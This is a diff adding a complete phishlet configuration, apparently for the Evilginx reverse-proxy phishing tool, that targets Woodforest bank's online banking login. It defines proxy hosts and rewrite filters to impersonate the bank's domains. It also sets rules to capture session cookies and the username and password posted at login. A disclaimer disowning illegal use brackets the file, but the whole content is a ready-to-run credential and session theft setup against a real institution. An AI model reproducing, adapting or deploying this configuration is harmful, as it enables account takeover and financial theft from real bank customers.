@@ -1,0 +1,36 @@
+# THE AUTHOR OF THIS PHISHLET DO NOT SUPPORT ANY ILLEGAL ACTIVITIES...
+
+author: '@i_am_a_Good_Human' 
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'online', orig_sub: 'online', domain: 'woodforest.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'woodforest.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'woodforest.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'online.woodforest.com', orig_sub: 'online', domain: 'woodforest.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.woodforest.com', orig_sub: 'online', domain: 'woodforest.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.woodforest.com', orig_sub: 'www', domain: 'woodforest.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.woodforest.com', orig_sub: 'www', domain: 'woodforest.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.woodforest.com', orig_sub: '', domain: 'woodforest.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'online.woodforest.com', orig_sub: '', domain: 'woodforest.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.woodforest.com'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'principal'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'online.woodforest.com'
+  path: '/login'
+  
+# THE AUTHOR OF THIS PHISHLET DO NOT SUPPORT ANY ILLEGAL ACTIVITIES...  
+  
